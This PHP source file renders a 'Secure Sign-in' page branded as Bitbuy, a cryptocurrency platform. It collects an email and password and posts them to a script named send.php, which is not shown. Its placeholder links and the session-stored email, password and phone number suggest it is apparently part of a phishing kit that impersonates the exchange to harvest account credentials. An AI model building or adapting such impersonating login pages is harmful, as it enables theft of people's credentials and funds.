<?php include_once './config.php';?>
<html lang="en">
    <?php
        unset($_SESSION['email']);
        unset($_SESSION['password']);
        unset($_SESSION['phone_number']);
    
        $title = 'Sign in Bitbuy';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class='container'>
            <div class="row justify-content-center mt60 pt60">
                <div class='col-sm-5 bg-white rounded-5 shadow-lg text-dark p25'>
                    <div class='col-sm-12 text-center'>
                        <h1 class='h4 fw-bold'>Secure Sign-in</h1>
                    </div>
                    <form method="post" action="<?= base_url('send.php')?>" class="">
                        <div class="form-floating my25">
                            <input name="email" type="email" required="" class="form-control" placeholder="Email" value="" >
                            <label>Email</label>
                        </div>
                        <div class="form-floating my25">
                            <input name="password" type="password" required="" minlength="3" class="form-control" placeholder="Password" value="">
                            <label htmlFor="floatingInput">Password</label>
                        </div>
                        <div class="text-center mx-auto d-grid gap-2 my25">
                            <button type="submit" class="btn btn-danger btn-primary-2 btn-lg btn-block">Sign In</button>
                        </div>
                        <div class="row my10 text-center">
                            <div class='col-sm-12'>
                                <a href="#" class='btn btn-link text-danger' >Forgot password?</a>
                            </div>
                        </div>
                        <div class="row my10 text-center">
                            <div class=''>Don't have an account? <span class='text-danger'>Sign up</span></div>
                            <div class='fs12 pt15'>Choose the original platform you used to create your account</div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>